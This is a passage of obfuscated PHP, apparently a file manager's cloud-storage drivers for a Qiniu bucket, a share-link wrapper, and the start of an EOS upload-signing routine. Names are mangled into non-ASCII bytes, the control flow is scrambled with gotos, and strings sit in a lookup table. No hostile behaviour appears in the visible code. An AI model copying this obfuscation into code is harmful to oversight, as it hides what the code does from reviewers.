a«Ó÷³ÔßÈ: } public function copyFile($bÃñôˆŠİ˜, $f‚Ş†¥‘õ) { $f¨×Ì´™£• = $this->bucketManager->copy($this->bucket, $bÃñôˆŠİ˜, $this->bucket, $f‚Ş†¥‘õ, !0); return $f¨×Ì´™£• ? !1 : $this->getPathOuter($f‚Ş†¥‘õ); } public function moveFile($e¾ÒÃ¬ĞÓñ, $aâ•‡ö‡¸¿) { $cé¯‰ä÷Ô» = $this->bucketManager->move($this->bucket, $e¾ÒÃ¬ĞÓñ, $this->bucket, $aâ•‡ö‡¸¿, !0); return $cé¯‰ä÷Ô» ? !1 : $this->getPathOuter($aâ•‡ö‡¸¿); } public function delFile($EŠ½„Ö¨Ú†) { if (!$this->exist($EŠ½„Ö¨Ú†)) { return !0; } $DÂ±ÁÁ³¡ = $this->bucketManager->delete($this->bucket, $EŠ½„Ö¨Ú†); return $DÂ±ÁÁ³¡ ? !1 : !0; } public function delFolder($fëƒÕ´ŠìÍ) { goto aÉ‘à”œæĞ; D´Ğ–¦ŸÀæ: if (!empty($fëƒÕ´ŠìÍ) && $fëƒÕ´ŠìÍ !== $A–—Ò«ËÒİ[201] && !in_array($C°íØå×¼, $eŒ¶†ÓÆî†[$A–—Ò«ËÒİ[85]])) { $eŒ¶†ÓÆî†[$A–—Ò«ËÒİ[85]][] = $C°íØå×¼; } $dÂ©‹ÈÄˆÍ = $this->delByBatch($eŒ¶†ÓÆî†[$A–—Ò«ËÒİ[84]]); if (!$dÂ©‹ÈÄˆÍ) { return !1; } goto A¹İ”ùÌø; c¾Ûéñ ›Ê: $eŒ¶†ÓÆî† = $this->fileList($fëƒÕ´ŠìÍ); $this->listItemCache = !0; $C°íØå×¼ = trim($fëƒÕ´ŠìÍ, $A–—Ò«ËÒİ[8]) . $A–—Ò«ËÒİ[8]; goto D´Ğ–¦ŸÀæ; aÉ‘à”œæĞ: $A–—Ò«ËÒİ =& $_SERVER[œÕÊİğö]; if (!$this->exist($fëƒÕ´ŠìÍ)) { return !0; } $this->listItemCache = !1; goto c¾Ûéñ ›Ê; A¹İ”ùÌø: $dÂ©‹ÈÄˆÍ = $this->delByBatch($eŒ¶†ÓÆî†[$A–—Ò«ËÒİ[85]]); if (!$dÂ©‹ÈÄˆÍ) { return !1; } return $this->delFile($C°íØå×¼); goto C«‡–Ôø; C«‡–Ôø: } private function delByBatch($B‹áº¯ˆ”ï) { foreach (array_chunk($B‹áº¯ˆ”ï, 1000) as $c°ÕÜØÆ²Ä) { $CŒ£Á²Î° = $this->bucketManager->buildBatchDelete($this->bucket, $c°ÕÜØÆ²Ä); list($DïùòùÓ½İ, $C‹ëğ»ô) = $this->bucketManager->batch($CŒ£Á²Î°); if ($C‹ëğ»ô) { return !1; } } return !0; } public function rename($bÀ‡Ù×Ùƒİ, $bá½˜Â‹™ì) { return $this->renameObject($bÀ‡Ù×Ùƒİ, $bá½˜Â‹™ì); } public function fileInfo($dã‘„ˆá´Å, $C‘¢ê¸†æ = false, $eòöÈ¼‹¹§ = array()) { goto aŒ …–ìø«; bïÓ§Ù¤Ú: if (isset($eòöÈ¼‹¹§[$d‹å»ê‰¿…[1326]])) { $D†øÅœÊ¡¢[$d‹å»ê‰¿…[94]] = substr($eòöÈ¼‹¹§[$d‹å»ê‰¿…[1326]] . $d‹å»ê‰¿…[43], 0, 10); } if (isset($eòöÈ¼‹¹§[$d‹å»ê‰¿…[1325]])) { $D†øÅœÊ¡¢[$d‹å»ê‰¿…[88]] = $eòöÈ¼‹¹§[$d‹å»ê‰¿…[1325]]; } return $D†øÅœÊ¡¢; goto E‰¹Ê†…Û•; aŒ …–ìø«: $d‹å»ê‰¿… =& $_SERVER[œÕÊİğö]; $D†øÅœÊ¡¢ = array($d‹å»ê‰¿…[38] => $this->pathThis($dã‘„ˆá´Å), $d‹å»ê‰¿…[86] => $this->getPathOuter($d‹å»ê‰¿…[8] . $dã‘„ˆá´Å), $d‹å»ê‰¿…[39] => $d‹å»ê‰¿…[203], $d‹å»ê‰¿…[88] => isset($eòöÈ¼‹¹§[$d‹å»ê‰¿…[1325]]) ? $eòöÈ¼‹¹§[$d‹å»ê‰¿…[1325]] : 0, $d‹å»ê‰¿…[178] => $this->ext($dã‘„ˆá´Å)); if ($C‘¢ê¸†æ) { return $D†øÅœÊ¡¢; } goto EİöÁ¦µÜ; EİöÁ¦µÜ: $D†øÅœÊ¡¢[$d‹å»ê‰¿…[204]] = $D†øÅœÊ¡¢[$d‹å»ê‰¿…[94]] = 0; $D†øÅœÊ¡¢[$d‹å»ê‰¿…[205]] = $D†øÅœÊ¡¢[$d‹å»ê‰¿…[206]] = !0; if (empty($eòöÈ¼‹¹§)) { $eòöÈ¼‹¹§ = $this->objectMeta($dã‘„ˆá´Å); if (!$eòöÈ¼‹¹§) { return $D†øÅœÊ¡¢; } } goto bïÓ§Ù¤Ú; E‰¹Ê†…Û•: } public function folderInfo($C§šëĞ©ÌÜ, $a†‰Êßù¬ = false) { goto dù‡œØ…àã; aİôÖ’É÷: $aóåÑ’ƒ“‚ = $this->objectMeta($C§šëĞ©ÌÜ); if (isset($aóåÑ’ƒ“‚[$d„¿¿ğÈ—¤[1326]])) { $e‹«Ü³×ì£[$d„¿¿ğÈ—¤[94]] = substr($aóåÑ’ƒ“‚[$d„¿¿ğÈ—¤[1326]] . $d„¿¿ğÈ—¤[43], 0, 10); } return $e‹«Ü³×ì£; goto eá¹­’£È•; E ŠÂ›­Ûê: $e‹«Ü³×ì£[$d„¿¿ğÈ—¤[204]] = $e‹«Ü³×ì£[$d„¿¿ğÈ—¤[94]] = 0; $e‹«Ü³×ì£[$d„¿¿ğÈ—¤[205]] = $e‹«Ü³×ì£[$d„¿¿ğÈ—¤[206]] = !0; $C§šëĞ©ÌÜ = rtrim($C§šëĞ©ÌÜ, $d„¿¿ğÈ—¤[8]) . $d„¿¿ğÈ—¤[8]; goto aİôÖ’É÷; dù‡œØ…àã: $d„¿¿ğÈ—¤ =& $_SERVER[œÕÊİğö]; $e‹«Ü³×ì£ = array($d„¿¿ğÈ—¤[38] => $this->pathThis($C§šëĞ©ÌÜ), $d„¿¿ğÈ—¤[86] => $this->getPathOuter($d„¿¿ğÈ—¤[8] . $C§šëĞ©ÌÜ), $d„¿¿ğÈ—¤[39] => $d„¿¿ğÈ—¤[87]); if ($a†‰Êßù¬) { return $e‹«Ü³×ì£; } goto E ŠÂ›­Ûê; eá¹­’£È•: } public function listPath($Fá÷§¤’ù˜, $Aø“ğº‚Ä = false) { $fâ’Ğ´Í¸ =& $_SERVER[œÕÊİğö]; $DæŸá¨è“ = $this->fileList($Fá÷§¤’ù˜, $fâ’Ğ´Í¸[8], !0); foreach ($DæŸá¨è“[$fâ’Ğ´Í¸[85]] as $D§ƒâ£À– => $a¦„„ìàÉ¦) { $DæŸá¨è“[$fâ’Ğ´Í¸[85]][$D§ƒâ£À–] = $this->folderInfo($a¦„„ìàÉ¦, $Aø“ğº‚Ä); } foreach ($DæŸá¨è“[$fâ’Ğ´Í¸[84]] as $D§ƒâ£À– => $a¦„„ìàÉ¦) { $DæŸá¨è“[$fâ’Ğ´Í¸[84]][$D§ƒâ£À–] = $this->fileInfo($a¦„„ìàÉ¦[$fâ’Ğ´Í¸[103]], $Aø“ğº‚Ä, $a¦„„ìàÉ¦); } return $DæŸá¨è“; } public function has($B¶ÔŸ§‚ë‰, $eùğ®»ää‹ = false, $e…ñˆâÆ‹‰ = true) { goto eÒ“Š–ó; c†ôğ®æ: $cƒè«ÉÌÒ² = $C©Ù‹¡© = 0; while (!0) { check_abort(); list($cŒáŠŒçã, $CÚÏ÷²Á˜â) = $this->bucketManager->listFiles($this->bucket, $a–ğø›Æ®©, $F°åáìÀ, $fÉ’ÀĞÍ×³, $aëÖ–±Äã­); if ($CÚÏ÷²Á˜â) { break; } $F°åáìÀ = array_key_exists($bŒ†šÚ±ôÏ[1296], $cŒáŠŒçã) ? $F°åáìÀ = $cŒáŠŒçã[$bŒ†šÚ±ôÏ[1327]] : $bŒ†šÚ±ôÏ[43]; if ($eùğ®»ää‹) { if (!empty($cŒáŠŒçã[$bŒ†šÚ±ôÏ[1328]])) { $cƒè«ÉÌÒ² += count($cŒáŠŒçã[$bŒ†šÚ±ôÏ[1328]]); } if (!empty($cŒáŠŒçã[$bŒ†šÚ±ôÏ[1329]])) { $C©Ù‹¡© += count($cŒáŠŒçã[$bŒ†šÚ±ôÏ[1329]]); } if ($F°åáìÀ === $bŒ†šÚ±ôÏ[43]) { break; } continue; } if ($e…ñˆâÆ‹‰) { if (!empty($cŒáŠŒçã[$bŒ†šÚ±ôÏ[1328]])) { return !0; } } else { if (!empty($cŒáŠŒçã[$bŒ†šÚ±ôÏ[1329]])) { return !0; } } if ($F°åáìÀ === $bŒ†šÚ±ôÏ[43]) { break; } } if ($eùğ®»ää‹) { return array($bŒ†šÚ±ôÏ[213] => $cƒè«ÉÌÒ², $bŒ†šÚ±ôÏ[214] => $C©Ù‹¡©); } goto BÃ­õù…ğò; eÒ“Š–ó: $bŒ†šÚ±ôÏ =& $_SERVER[œÕÊİğö]; $B¶ÔŸ§‚ë‰ = trim($B¶ÔŸ§‚ë‰, $bŒ†šÚ±ôÏ[8]); $a–ğø›Æ®© = empty($B¶ÔŸ§‚ë‰) && $B¶ÔŸ§‚ë‰ !== $bŒ†šÚ±ôÏ[201] ? $bŒ†šÚ±ôÏ[43] : $B¶ÔŸ§‚ë‰ . $bŒ†šÚ±ôÏ[8]; goto a”ò¸Ç“¶·; a”ò¸Ç“¶·: $F°åáìÀ = $bŒ†šÚ±ôÏ[43]; $fÉ’ÀĞÍ×³ = 500; $aëÖ–±Äã­ = $bŒ†šÚ±ôÏ[8]; goto c†ôğ®æ; BÃ­õù…ğò: return !1; goto cø¥Û‚‘Ë; cø¥Û‚‘Ë: } public function listAll($Fï¡çàí›¾) { $e¹¡§Éàâ· =& $_SERVER[œÕÊİğö]; $c”ŸÅÑ·¼» = $this->fileList($Fï¡çàí›¾, $e¹¡§Éàâ·[43], !0); $f·„‰ê•‰ = array(); foreach ($c”ŸÅÑ·¼»[$e¹¡§Éàâ·[84]] as $dÓ©¦ˆ™„) { $f·„‰ê•‰[$dÓ©¦ˆ™„[$e¹¡§Éàâ·[103]]] = $dÓ©¦ˆ™„[$e¹¡§Éàâ·[88]]; } foreach ($c”ŸÅÑ·¼»[$e¹¡§Éàâ·[85]] as $dÓ©¦ˆ™„) { if (is_string($dÓ©¦ˆ™„)) { $f·„‰ê•‰[$dÓ©¦ˆ™„] = 0; } } return $this->listAllFiles($Fï¡çàí›¾, array_keys($f·„‰ê•‰), $f·„‰ê•‰); } private function fileList($bĞĞ¾†æğ, $CÊ‡˜‘‹‹  = '', $B„àˆõ¥² = 0) { goto cõÍèïÊ‡Œ; b…×Û·Çë¼: $Eìß×Ë•„‰ = $bÂ¿ƒÒ·Ò³ = array(); while (!0) { check_abort(); list($cÒÄğ£äÑ, $F°½™¸—åÀ) = $this->bucketManager->listFiles($this->bucket, $cÓù­æÃ¸¹, $cª±œØïÄ, $bŒ•í¶æÓ§, $CÊ‡˜‘‹‹ ); if ($F°½™¸—åÀ) { break; } $cª±œØïÄ = array_key_exists($DÑ¸øö³Í«[1296], $cÒÄğ£äÑ) ? $cª±œØïÄ = $cÒÄğ£äÑ[$DÑ¸øö³Í«[1327]] : $DÑ¸øö³Í«[43]; $FšéèŞÈê£ = isset($cÒÄğ£äÑ[$DÑ¸øö³Í«[1328]]) ? $cÒÄğ£äÑ[$DÑ¸øö³Í«[1328]] : array(); $d±êğĞöŒã = isset($cÒÄğ£äÑ[$DÑ¸øö³Í«[1329]]) ? $cÒÄğ£äÑ[$DÑ¸øö³Í«[1329]] : array(); foreach ($FšéèŞÈê£ as $AÊâæ…áŒ†) { goto A²Ëğ®™—¦; BÖ„Ì¿ò²: $AÊâæ…áŒ†[$DÑ¸øö³Í«[88]] = $d¼¯²Ü³ó’; $D§ø¼ÖÅµ‡ = $d¼¯²Ü³ó’ == 0 && substr($A³ÏÌÄöÌÑ, strlen($A³ÏÌÄöÌÑ) - 1, 1) == $DÑ¸øö³Í«[8] ? !0 : !1; if ($EÃ¬‘ÏÀø) { $this->cacheMethod($DÑ¸øö³Í«[209], $A³ÏÌÄöÌÑ, $D§ø¼ÖÅµ‡); $this->cacheMethod($DÑ¸øö³Í«[210], $A³ÏÌÄöÌÑ, $AÊâæ…áŒ†); } goto Fê£ØÁË ; Fê£ØÁË : if ($D§ø¼ÖÅµ‡) { $Eìß×Ë•„‰[] = $A³ÏÌÄöÌÑ; continue; } $bÂ¿ƒÒ·Ò³[] = $B„àˆõ¥² ? $AÊâæ…áŒ† : $A³ÏÌÄöÌÑ; goto f¼ï±ó‡ÀÌ; A²Ëğ®™—¦: if ($AÊâæ…áŒ†[$DÑ¸øö³Í«[103]] == $cÓù­æÃ¸¹) { continue; } $A³ÏÌÄöÌÑ = $AÊâæ…áŒ†[$DÑ¸øö³Í«[103]]; $d¼¯²Ü³ó’ = $AÊâæ…áŒ†[$DÑ¸øö³Í«[1325]]; goto BÖ„Ì¿ò²; f¼ï±ó‡ÀÌ: } foreach ($d±êğĞöŒã as $A³ÏÌÄöÌÑ) { if ($A³ÏÌÄöÌÑ == $cÓù­æÃ¸¹) { continue; } $Eìß×Ë•„‰[] = $A³ÏÌÄöÌÑ; if ($EÃ¬‘ÏÀø) { $this->cacheMethod($DÑ¸øö³Í«[209], $A³ÏÌÄöÌÑ, !0); } } if ($cª±œØïÄ === $DÑ¸øö³Í«[43]) { break; } } if ($EÃ¬‘ÏÀø) { $this->cacheMethod($DÑ¸øö³Í«[209], $bĞĞ¾†æğ, !0); } goto aéëÖ£·Âô; cõÍèïÊ‡Œ: $DÑ¸øö³Í« =& $_SERVER[œÕÊİğö]; $bĞĞ¾†æğ = trim($bĞĞ¾†æğ, $DÑ¸øö³Í«[8]); $cÓù­æÃ¸¹ = empty($bĞĞ¾†æğ) && $bĞĞ¾†æğ !== $DÑ¸øö³Í«[201] ? $DÑ¸øö³Í«[43] : $bĞĞ¾†æğ . $DÑ¸øö³Í«[8]; goto C‡¶„ãÉä—; C‡¶„ãÉä—: $cª±œØïÄ = $DÑ¸øö³Í«[43]; $bŒ•í¶æÓ§ = 1000; $EÃ¬‘ÏÀø = $this->listItemCache === !1 ? !1 : !0; goto b…×Û·Çë¼; aéëÖ£·Âô: return array($DÑ¸øö³Í«[85] => $Eìß×Ë•„‰, $DÑ¸øö³Í«[84] => $bÂ¿ƒÒ·Ò³); goto Dö’Ù±åÓŒ; Dö’Ù±åÓŒ: } public function canRead($côÇ÷’•åƒ) { return $this->exist($côÇ÷’•åƒ) ? !0 : !1; } public function canWrite($c×¬›‹÷´Æ) { return $this->exist($c×¬›‹÷´Æ) ? !0 : !1; } public function getContent($c…¤ˆ–³Øæ) { return $this->fileSubstr($c…¤ˆ–³Øæ, 0, -1); } public function setContent($bœ™¹ì»öŞ, $E±…§ø¥™ = '') { $dí§•Ï‰ˆÅ = $this->tempFile($this->pathThis($bœ™¹ì»öŞ)); file_put_contents($dí§•Ï‰ˆÅ, $E±…§ø¥™); if ($this->upload($bœ™¹ì»öŞ, $dí§•Ï‰ˆÅ)) { $this->tempFileRemve($dí§•Ï‰ˆÅ); return !0; } return !1; } public function refreshUrls($eä¸Éš‚¢™) { goto FáÏÈºò¶ó; FáÏÈºò¶ó: $E’ƒçÂêŒæ =& $_SERVER[œÕÊİğö]; $a­­•Å‚ß÷ = array(); if (is_array($eä¸Éš‚¢™)) { foreach ($eä¸Éš‚¢™ as $bí‚‘ó°š§) { $a­­•Å‚ß÷[] = $this->link($bí‚‘ó°š§); } } else { $a­­•Å‚ß÷[] = $this->link($eä¸Éš‚¢™); } goto Cåâö©ØÈ; Cåâö©ØÈ: $e¥ÔÂáöØÁ = new Qiniu\Cdn\CdnManager($this->auth); list($f„™šÄÍ, $eŠ ›¥Œöí) = $e¥ÔÂáöØÁ->refreshUrls($a­­•Å‚ß÷); if ($eŠ ›¥Œöí) { return !1; } goto cÉÂ§™™é½; cÉÂ§™™é½: return $f„™šÄÍ[$E’ƒçÂêŒæ[1100]] == $E’ƒçÂêŒæ[750] ? !0 : !1; goto C…ë¯Œ¹–; C…ë¯Œ¹–: } public function fileSubstr($DÒóÚ”´Œã, $båãÕ¸¦â‰, $aµÕ´“Æ¥Ä) { $DÈÛ°ĞŞÂ¤ =& $_SERVER[œÕÊİğö]; if (!($c’º–…ÊÕš = $this->link($DÒóÚ”´Œã))) { return !1; } $a­…Úå¨‹‚ = !1; if ($aµÕ´“Æ¥Ä > 0) { $BÏßâîÙÄ = $båãÕ¸¦â‰ + $aµÕ´“Æ¥Ä - 1; $a­…Úå¨‹‚ = array($DÈÛ°ĞŞÂ¤[1330] . $båãÕ¸¦â‰ . $DÈÛ°ĞŞÂ¤[463] . $BÏßâîÙÄ); } $d™‹¾¢ìåğ = url_request($c’º–…ÊÕš, $DÈÛ°ĞŞÂ¤[238], !1, $a­…Úå¨‹‚); return $d™‹¾¢ìåğ[$DÈÛ°ĞŞÂ¤[740]] ? $d™‹¾¢ìåğ[$DÈÛ°ĞŞÂ¤[1110]] : !1; } public function upload($D¸ù„Öª¡×, $bÑí‰ÆÌ’£, $a»Á×˜ˆ«Ù = false, $c°Ô´ËòÍÍ = REPEAT_REPLACE) { $Côä´„¹Ñ— = new Qiniu\Storage\UploadManager(); $FßÔºÏÃ®® = $this->auth->uploadToken($this->bucket, $D¸ù„Öª¡×); $bÏâ†¾¶òÚ = get_file_mime(get_path_ext($bÑí‰ÆÌ’£)); list($d¾ÓÜøôˆ¦, $c¦©ÚÕÙ‡ö) = $Côä´„¹Ñ—->putFile($FßÔºÏÃ®®, $D¸ù„Öª¡×, $bÑí‰ÆÌ’£, null, $bÏâ†¾¶òÚ); return $c¦©ÚÕÙ‡ö ? !1 : $this->getPathOuter($D¸ù„Öª¡×); } public function uploadFormData($E…¬‰„îÈ, $b¬â†‚°Ó = 3600) { return $this->uploadToken($E…¬‰„îÈ, $b¬â†‚°Ó); } public function multiUploadFormData($B´°’‘ÙŒâ, $EÊ„ñÒêóŸ = 3600) { return $this->uploadToken($B´°’‘ÙŒâ, $EÊ„ñÒêóŸ); } private function uploadToken($B´ºÏÇ¾¥, $DÊß²Ùè = 3600) { goto Cá—ÈÔ½Ùï; b©é½°‚ïÇ: $CºÇŠáç÷ = $B´ºÏÇ¾¥; $cª‘„“Ç¹ï = $this->auth->uploadToken($this->bucket, $CºÇŠáç÷, $C¦ù¥£‰Œ , $F”ËŠ²÷½Ô, !0); $c¹×ôê²«Ô = empty($this->region) || $this->region == $b¥îãƒŞ‚º[1333] ? $b¥îãƒŞ‚º[43] : $b¥îãƒŞ‚º[463] . $this->region; goto FˆÁ Æ†î; Cá—ÈÔ½Ùï: $b¥îãƒŞ‚º =& $_SERVER[œÕÊİğö]; $C¦ù¥£‰Œ  = $DÊß²Ùè; $F”ËŠ²÷½Ô = array($b¥îãƒŞ‚º[1331] => $b¥îãƒŞ‚º[1332]); goto b©é½°‚ïÇ; FˆÁ Æ†î: $cèµÇ´”®‘ = http_type() . "\x3a\x2f\x2f\x75\160\154\157\141\144{$c¹×ôê²«Ô}\x2e\x71\x69\156\151\165\x70\56\143\x6f\x6d\57"; return array($b¥îãƒŞ‚º[1334] => $cª‘„“Ç¹ï, $b¥îãƒŞ‚º[1335] => $cèµÇ´”®‘); goto eª™¼‰Ü›; eª™¼‰Ü›: } public function download($aèæˆõÚÑ˜, $Câİ¶µ¦“Æ) { goto Aá¥–ƒ†äó; aÚå®šÍ¼å: $C†ÒÍì‘ï = 1024 * 200; $d„˜Û„†ß® = fopen($E¥…è‘œ•¾, $_SERVER[œÕÊİğö][1336]); while (!0) { $eÌÜŒ†Ü = $this->fileSubstr($aèæˆõÚÑ˜, $AÜùï¼à±, $C†ÒÍì‘ï); if ($eÌÜŒ†Ü === !1) { return !1; } fwrite($d„˜Û„†ß®, $eÌÜŒ†Ü); $AÜùï¼à± += $C†ÒÍì‘ï; if (strlen($eÌÜŒ†Ü) < $C†ÒÍì‘ï) { break; } } goto c §æÇš‘; c §æÇš‘: fclose($d„˜Û„†ß®); return $Câİ¶µ¦“Æ; goto a¤Ô¡†Ò‘®; Aá¥–ƒ†äó: $E¥…è‘œ•¾ = IO::getPathInner(IO::mkfile($Câİ¶µ¦“Æ)); if (!($c‰À£ÌÖÏè = $this->link($aèæˆõÚÑ˜))) { return !1; } $AÜùï¼à± = 0; goto aÚå®šÍ¼å; a¤Ô¡†Ò‘®: } public function link($BæóŠ—åÔ, $cë­Âˆ‚Á = '') { if (!$this->isFile($BæóŠ—åÔ)) { return !1; } $c¾‰ÌÌî© = $this->getHost() . $_SERVER[œÕÊİğö][8] . $this->pathEncode($BæóŠ—åÔ) . $cë­Âˆ‚Á; return $this->auth->privateDownloadUrl($c¾‰ÌÌî©, 3600 * 12); } public function fileOut($f§‚—í¨Éò, $câ‚Î¹ïÛ‡ = false, $CŸÒÂ¨ƒ¤§ = false, $FÏæµÊè ® = '') { $E¿†ïêï¯Õ =& $_SERVER[œÕÊİğö]; if ($this->isFileOutServer()) { return $this->fileOutServer($f§‚—í¨Éò, $câ‚Î¹ïÛ‡, $CŸÒÂ¨ƒ¤§, $FÏæµÊè ®); } if (!$CŸÒÂ¨ƒ¤§) { $CŸÒÂ¨ƒ¤§ = $this->pathThis($f§‚—í¨Éò); } $DƒÉµèŠ¾ = $câ‚Î¹ïÛ‡ ? $E¿†ïêï¯Õ[1337] . rawurlencode($CŸÒÂ¨ƒ¤§) : $E¿†ïêï¯Õ[43]; $dƒ·ñÑ§è– = $this->link($f§‚—í¨Éò, $DƒÉµèŠ¾); $this->fileOutLink($dƒ·ñÑ§è–); } public function fileOutServer($D÷˜Ì¼±‘Ğ, $Fêô…»”Å· = false, $A‹Ç±Š“œÓ = false, $f‚àÑÓ‘ù = '') { parent::fileOut($D÷˜Ì¼±‘Ğ, $Fêô…»”Å·, $A‹Ç±Š“œÓ, $f‚àÑÓ‘ù); } public function fileOutImage($BÙĞÈ…º™Á, $dØŒäÉØÔç = 250) { $DµÙëµ¹íÉ = $this->link($BÙĞÈ…º™Á, $_SERVER[œÕÊİğö][1338] . $dØŒäÉØÔç); $this->fileOutLink($DµÙëµ¹íÉ); } public function fileOutImageServer($B¯´‰«ÑÊá, $Eöğîõ’éÛ = 250) { parent::fileOutImage($B¯´‰«ÑÊá, $Eöğîõ’éÛ); } public function hashMd5($cš¶ó©Ë­) { $D¢¨„„¼“ß =& $_SERVER[œÕÊİğö]; $EÖêï§ñÜ = $this->objectMeta($cš¶ó©Ë­); return isset($EÖêï§ñÜ[$D¢¨„„¼“ß[218]]) ? $EÖêï§ñÜ[$D¢¨„„¼“ß[218]] : !1; $EÔœĞø‘Å÷ = $this->link($cš¶ó©Ë­, $D¢¨„„¼“ß[1339]); } public function size($d‹ÌÓÊ‚Ù‡) { $CªÆŒ‚¡ = $this->objectMeta($d‹ÌÓÊ‚Ù‡); return $CªÆŒ‚¡ ? $CªÆŒ‚¡[$_SERVER[œÕÊİğö][88]] : 0; } public function info($FÕïò¹±ª) { if ($this->isFolder($FÕïò¹±ª)) { return $this->folderInfo($FÕïò¹±ª); } else { if ($this->isFile($FÕïò¹±ª)) { return $this->fileInfo($FÕïò¹±ª); } } return !1; } public function exist($FíâÔƒ¸í) { return $this->isFile($FíâÔƒ¸í) || $this->isFolder($FíâÔƒ¸í); } public function isFile($eè¶ÒˆÌÇÒ) { return !$this->isFolder($eè¶ÒˆÌÇÒ) && $this->objectMeta($eè¶ÒˆÌÇÒ); } public function isFolder($d ¦©Ü­Æº) { return $this->cacheMethod($_SERVER[œÕÊİğö][209], $d ¦©Ü­Æº); } protected function objectMeta($C¿ñÕáéãò) { return $this->cacheMethod($_SERVER[œÕÊİğö][210], $C¿ñÕáéãò); } protected function _objectMeta($F¹·Œ¹ÁÆ©) { $F´ØèĞ¡·• =& $_SERVER[œÕÊİğö]; list($f¨–Ã…ÓÑî, $c‰–‡Ÿíì) = $this->bucketManager->stat($this->bucket, $F¹·Œ¹ÁÆ©); if ($f¨–Ã…ÓÑî) { $f¨–Ã…ÓÑî[$F´ØèĞ¡·•[88]] = intval($f¨–Ã…ÓÑî[$F´ØèĞ¡·•[1325]]); } return $f¨–Ã…ÓÑî; } protected function _isFolder($c¦ËÇàË­Í) { $Aë‰Ù¸ÍÃ =& $_SERVER[œÕÊİğö]; if ($c¦ËÇàË­Í == $Aë‰Ù¸ÍÃ[43] || $c¦ËÇàË­Í == $Aë‰Ù¸ÍÃ[8]) { return !0; } list($b£éğ·Šö„, $B‘ëù‡¶Ñó) = $this->bucketManager->listFiles($this->bucket, trim($c¦ËÇàË­Í, $Aë‰Ù¸ÍÃ[8]) . $Aë‰Ù¸ÍÃ[8], $Aë‰Ù¸ÍÃ[43], 1, $Aë‰Ù¸ÍÃ[8]); return !empty($b£éğ·Šö„[$Aë‰Ù¸ÍÃ[1328]]) || !empty($b£éğ·Šö„[$Aë‰Ù¸ÍÃ[1329]]) ? !0 : !1; } } goto EµŠõĞÏîŠ; dÑÄ¼“ ÖÑ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($aÊ´Õ¢ãÓ) { $this->pathParse = $aÊ´Õ¢ãÓ; } protected function infoParse($aÄåÅ½¼‹á, $EêÒ†ÖñÈæ = false) { $CŒ®‡·Ë¼Ê =& $_SERVER[œÕÊİğö]; return Action($CŒ®‡·Ë¼Ê[1092])->sharePathInfo($this->pathParse[$CŒ®‡·Ë¼Ê[86]], !0, $EêÒ†ÖñÈæ); } public function listPath($fÉÜİƒ·‡ƒ, $fĞÆÜ¿ÎÓ = false) { $eİÓ¸¥æ =& $_SERVER[œÕÊİğö]; $e”èÜ‹ˆ‰ = IO::listPath($fÉÜİƒ·‡ƒ, $fĞÆÜ¿ÎÓ); foreach ($e”èÜ‹ˆ‰ as $bîĞÜ×Ù† => $d´ĞÖ‘’àæ) { if (!in_array($bîĞÜ×Ù†, array($eİÓ¸¥æ[84], $eİÓ¸¥æ[85]))) { continue; } foreach ($d´ĞÖ‘’àæ as $BÏµŸ °àÛ => $FÃŞ‹¨°Ÿ’) { $FÃŞ‹¨°Ÿ’ = Action($eİÓ¸¥æ[1245])->parsePathChildren($FÃŞ‹¨°Ÿ’, array($eİÓ¸¥æ[425] => $fÉÜİƒ·‡ƒ)); $e”èÜ‹ˆ‰[$bîĞÜ×Ù†][$BÏµŸ °àÛ] = Action($eİÓ¸¥æ[1092])->shareItemInfo($FÃŞ‹¨°Ÿ’); } } return $e”èÜ‹ˆ‰; } public function listAll($E¥Ë‘äÅ„) { $DçŸèŒ¡·§ =& $_SERVER[œÕÊİğö]; $c¶¨³îÄ½ = IO::listAll($E¥Ë‘äÅ„); foreach ($c¶¨³îÄ½ as &$dˆÈÀ”·×Ë) { $BÅ°â ÙÓ = IO::info($dˆÈÀ”·×Ë[$DçŸèŒ¡·§[86]]); $BÅ°â ÙÓ = is_array($BÅ°â ÙÓ) ? $BÅ°â ÙÓ : array(); $dˆÈÀ”·×Ë = array_merge($BÅ°â ÙÓ, $dˆÈÀ”·×Ë); $dˆÈÀ”·×Ë[$DçŸèŒ¡·§[95]] = Action($DçŸèŒ¡·§[1092])->shareItemInfo($dˆÈÀ”·×Ë); } unset($dˆÈÀ”·×Ë); return $c¶¨³îÄ½; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($AŒ½¶ÜÎè¯) { parent::__construct($AŒ½¶ÜÎè¯); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($bÖ³ôõ£”³) { parent::__construct($bÖ³ôõ£”³); $this->signatureVersion($_SERVER[œÕÊİğö][222]); } public function uploadFormData($BÒ´ƒ‰ˆÜ‘, $f“®ù·œ° = 3600) { goto c““Ğù¢‡ˆ; F×µ³áË˜: $e›ê¤¿ø½„ = base64_encode(json_encode($bÉ¥ò†¥»)); $d° ±¨Û = hash_hmac($b‘åÛƒ’áµ[1256], $Bœè÷¦„íö, $b‘åÛƒ’áµ[1257] . $this->secret, !0); $E­«ÁøŠõò = hash_hmac($b‘åÛƒ’áµ[1256], $this->region, $d° ±¨Û, !0); goto Fñ«ƒ´•¬; aÔó´÷¶Š: $CñõÙö†Ï‰ = $b‘åÛƒ’áµ[69]; $F¤Ÿî¯‰¾ = gmdate($b‘åÛƒ’áµ[1247]); $Bœè÷¦„íö = gmdate($b‘åÛƒ’áµ[741]); goto b¸×ÖÑŸ–‡; b¸×ÖÑŸ–‡: $A¬ÁĞ•¢Â… = $b‘åÛƒ’áµ[1248]; $c÷…šëÚ±Ó = $f“®ù·œ° . $b‘åÛƒ’áµ[43]; $E¶ï„•¶Û¯ = $b‘åÛƒ’áµ[1211]; goto DÕ¡…ƒ†ÖÓ; Fñ«ƒ´•¬: $c‡ô·Ñö¬í = hash_hmac($b‘åÛƒ’áµ[1256], $CñõÙö†Ï‰, $E­«ÁøŠõò, !0); $dŒº©¡Ø›˜ = hash_hmac($b‘åÛƒ’áµ[1256], $A¬ÁĞ•¢Â…, $c‡ô·Ñö¬í, !0); $aìíçƒµœ¨ = hash_hmac($b‘åÛƒ’áµ[1256], $e›ê¤¿ø½„, $dŒº©¡Ø›˜); goto cƒ…•¨–Î; c““Ğù¢‡ˆ: $b‘åÛƒ’áµ =& $_SERVER[œÕÊİğö]; $Eº…Š¦‚¼ = $b‘åÛƒ’áµ[202]; $bç”Áéé = $b‘åÛƒ’áµ[1246]; goto aÔó´÷¶Š; cƒ…•¨–Î: $c°…¿¦¿ö = array($b‘åÛƒ’áµ[221] => $b‘åÛƒ’áµ[43], $b‘åÛƒ’áµ[1258] => 